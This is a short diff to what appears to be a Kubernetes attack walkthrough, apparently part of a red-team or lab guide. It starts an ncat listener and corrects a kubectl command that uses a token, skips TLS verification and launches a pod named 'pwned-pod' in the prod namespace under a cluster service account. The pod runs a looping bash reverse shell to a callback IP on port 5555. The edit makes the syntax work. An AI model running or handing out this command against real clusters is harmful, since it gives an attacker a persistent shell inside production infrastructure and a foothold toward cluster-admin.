@@ -77,7 +77,12 @@ ncat -lvnp 5555 &
 
 ```bash
 CALLBACK_IP=
-kubectl --insecure-skip-tls-verify --token=$TOKEN create pod pwned-pod -n prod --image=nginx:1.25 --serviceaccount=cluster-ops-sa -- /bin/bash -c "while true; do bash -i >& /dev/tcp/${CALLBACK_IP}/5555 0>&1; sleep 2; done"
+kubectl --insecure-skip-tls-verify --token=$TOKEN run pwned-pod \
+  -n prod \
+  --image=nginx:1.25 \
+  --serviceaccount=cluster-ops-sa \
+  --restart=Never \
+  -- /bin/bash -c "while true; do bash -i >& /dev/tcp/${CALLBACK_IP}/5555 0>&1; sleep 2; done"
 ```
 
 ## Part 3: Cluster-Admin
